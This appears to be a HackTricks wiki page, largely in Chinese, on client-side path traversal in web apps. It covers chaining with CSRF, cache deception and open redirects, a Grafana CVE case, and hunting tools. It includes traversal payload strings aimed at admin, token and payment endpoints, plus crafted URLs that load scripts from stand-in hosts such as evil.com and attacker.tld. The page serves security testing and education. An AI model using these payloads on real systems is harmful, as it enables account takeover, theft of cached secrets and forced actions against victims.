# Client Side Path Traversal

{{#include ../banners/hacktricks-training.md}}

## 基本信息

当你能够**操纵将被发送给用户以合法方式访问的 URL 的路径**，或者用户以某种方式被**强制访问（例如通过 JS 或 CSS）**时，就会发生 client side path traversal。CSPT 也被称为 **On-Site Request Forgery (OSRF)**，因为它允许你强迫受害者的浏览器使用他们的 cookies、JWTs 或 mTLS 证书对同一源上的任意路径发起请求。

典型来源（你控制的数据）：

- 路由参数被拼接到 `fetch()` 或 XHR 路径中（React Router、Next.js 动态路由、Vue router 参数、Angular 的 `ActivatedRoute`）。
- 存储值（profile slugs、document IDs）被插值到后台作业、service workers 或 WebSocket URL 的路径中。
- UI 控件（下载/导出 按钮、图片画廊）在请求派发前将用户控制的片段或文件扩展名追加到 API 端点。

典型下游（遍历落点）：

- 前端 API 封装会在前面加上 `/api/` 或 `/proxy/` 并自动重用认证头。
- `history.pushState` / `router.navigate` 辅助函数在 hydration 期间后续重构 URL。
- 由 CMS 内容或 feature-flag payload 生成的 `<link>`/`<style>`/`@import` 语句。

### 常见影响与链式攻击

- **CSPT ➜ CSRF/OSRF**: 劫持经过身份验证的 `POST/PUT/DELETE` 调用，通过逃逸原本的资源路径，然后重新进入敏感端点（密码重置、支付批准、访问撤销）。将其与 [CSRF](csrf-cross-site-request-forgery.md) 检查表结合以升级影响。
- **CSPT ➜ cache deception / poisoning**: 通过公共 CDN 键提供攻击者控制的 JSON 并以匿名方式重放。参见 [Cache Poisoning and Cache Deception](cache-deception/README.md)。
- **CSPT ➜ Open Redirect ➜ XSS/SSRF**: 遍历落点到 open redirect 端点，然后重定向到攻击者基础设施，该处提供恶意 JS 或 SSRF 载荷。可与 [Open Redirect](open-redirect.md) 滥用链式结合。

### 示例案例

- 在 [**this writeup**](https://erasec.be/blog/client-side-path-manipulation/)，可以 **更改邀请 URL**，从而最终 **取消一张卡片**。
- 在 [**this writeup**](https://mr-medi.github.io/research/2022/11/04/practical-client-side-path-traversal-attacks.html)，能够将 **通过 CSS 的 client side path traversal**（即可以更改加载 CSS 资源的路径）与 **open redirect** 结合，以便从 **攻击者控制的域** 加载该 CSS 资源。
- 在 [**this writeup**](https://blog.doyensec.com/2024/07/02/cspt2csrf.html)，可以看到如何滥用 CSPT **执行 CSRF 攻击** 的技术。该方法通过**监控攻击者可控的所有数据**（URL 路径、参数、片段、注入到数据库的数据……）以及这些数据最终落入的**下游**（被执行的请求）来实现。
- 查看 [**this browser extension**](https://addons.mozilla.org/en-US/firefox/addon/eval-villain/) 以进行监控。
- 试用该技术，请查看 [**CSPT playground**](https://github.com/doyensec/CSPTPlayground)。
- 查看 [**this tutorial**](https://blog.doyensec.com/2024/12/03/cspt-with-eval-villain.html) 了解如何在 playground 中使用该浏览器扩展。

## CSPT-assisted web cache poisoning/deception

CSPT 可以与扩展驱动的 CDN 缓存链式结合，用来从经过身份验证的 API 调用泄露的敏感 JSON 中窃取数据：

- 前端将用户控制的输入拼接到 API 路径中并在 fetch/XHR 中附加认证头。
- 通过注入点段（../）你可以将经过身份验证的请求重定向到同一源上的不同端点。
- 如果该端点（或带有看似静态后缀的路径变体，例如 .css）被 CDN 缓存且未基于认证头变化，则受害者的经过身份验证的响应可能会存储在公共缓存键下，任何人都可以检索到。

快速操作步骤：

1) 查找在发送认证头时从路径参数构建 API URL 的 SPA 代码。  
2) 识别敏感端点并测试静态后缀（.css, .js, .jpg, .json），查看 CDN 在返回 JSON 时是否改为 Cache-Control: public/max-age 和 X-Cache: Hit。  
3) 引诱受害者访问一个在 SPA 参数中注入遍历的 URL，使得经过身份验证的 fetch 命中可缓存的路径变体（例如，../../../v1/token.css）。  
4) 匿名读取相同的 URL 以获取缓存的秘密（token → ATO）。

详情和缓解措施见 Cache Deception 页面： [Cache Poisoning and Cache Deception](cache-deception/README.md)。

## Hunting workflow & tooling

### Passive discovery with intercepting proxies

- **Correlate sources/sinks automatically**: the [CSPT Burp extension](https://github.com/doyensec/CSPTBurpExtension) 解析你的代理历史，聚类随后在其他请求路径中被反射的参数，并能重新发出带有 canary 令牌的证明概念 URL 以确认可利用的遍历。加载 JAR 后，将 `Source Scope` 设置为客户端参数（例如，`id`、`slug`），并将 `Sink Methods` 设置为 `GET, POST, DELETE`，这样扩展会突出显示危险的请求构建器。你可以导出所有带嵌入 canary 的可疑来源以进行批量验证。
- **Look for double-URL-decoding**: 在使用 Burp 或 ZAP 浏览时，注意 `/api/%252e%252e/` 这类模式，它们在到达网络之前会被前端规范化——这些通常以 base64 编码的 JSON 正文出现，引用路由状态，若无自动化扫描器很容易被忽视。

### Instrumenting SPA sinks manually

手动在 DevTools 注入一小段脚本可以在你与 UI 交互时揭示隐藏的遍历：
```javascript
(() => {
const origFetch = window.fetch;
window.fetch = async function (input, init) {
if (typeof input === "string" && /\.\.\//.test(input)) {
console.log("[CSPT candidate]", input, init?.method || "GET");
debugger;
}
return origFetch.apply(this, arguments);
};
})();
```
- 在 `XMLHttpRequest.prototype.open`、`history.pushState` 和框架特定路由（例如 `next/router`）周围添加类似的包装器。监视 `init.credentials === "include"` 可以快速缩小携带会话 cookie 的请求范围。
- 如果应用在 IndexedDB/localStorage 中存储路由提示，使用 traversal payloads 编辑这些条目并重载——被变异的状态通常会在 pre-hydration 前被重新注入到请求中。

### 实验室 & payload 排练

- 通过 `docker compose up` 启动 CSPT Playground，并练习将 traversal ➜ CSRF ➜ stored XSS 链接起来的流程，而无需接触目标。 本地重现目标的 router 结构能让你更容易制作可共享的 PoCs。
- 在 recon 期间，把成功的 dot-segment 变体（`..;/`, `%2e%2e/`, `%2e./%2e/`, UTF-8 homoglyphs）和后缀技巧（`.css`, `.json`, `;` matrix params）记录在便签中，这样在出现新的 sink 时就可以快速重放。

## 近期案例研究（2025）

- **Grafana OSS CVE-2025-4123/6023 (v11.5.0+)** – 在 `/public/plugins/` 内的一个 traversal gadget 允许攻击者将 `../../` 偷运到 plugin asset loader，结合 Grafana 的 open redirect，迫使受害者加载攻击者控制的 plugin bundles。当 anonymous dashboards 启用时，构造的 URL（例如 `https://grafana.example.com/public/plugins/../../../../..//evil.com/poc/module.js`）会导致浏览器执行远程 JavaScript；如果安装了 Image Renderer plugin，相同的原语可以通过将渲染请求重定向到内部主机来转换为 SSRF。始终同时测试 plugin asset paths、anonymous dashboards 和 renderer endpoints，因为单次 traversal 通常能同时给出 XSS 和 SSRF 的利用角度。

## Payload 配方

| 目标 | Payload pattern | 说明 |
| --- | --- | --- |
| Hit sibling API under same origin | `?doc=../../v1/admin/users` | Works when routers simply concatenate `/${doc}`. Add `.json` if CDN only caches static-looking assets. |
| Force SPA to follow open redirect | `?next=..%2f..%2f..%2flogin/callback/%3FreturnUrl=https://attacker.tld/x` | Combine with trusted redirectors listed in target’s codebase. Chain with [Open Redirect](open-redirect.md). |
| Abuse extension-based CDN cache | `?file=../../v1/token.css` | CDN may treat `.css` as static and cache secrets returned as JSON. |
| CSRF via verb change | `?action=../../payments/approve/.json&_method=POST` | Some routers accept `_method` overrides; pair with traversal to re-target destructive endpoints. |

## References

- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Grafana CVE-2025-4123 Chained Path Traversal + Open Redirect Analysis](https://www.cve.news/cve-2025-4123/)
- [Doyensec CSPT Burp Extension](https://github.com/doyensec/CSPTBurpExtension)

{{#include ../banners/hacktricks-training.md}}
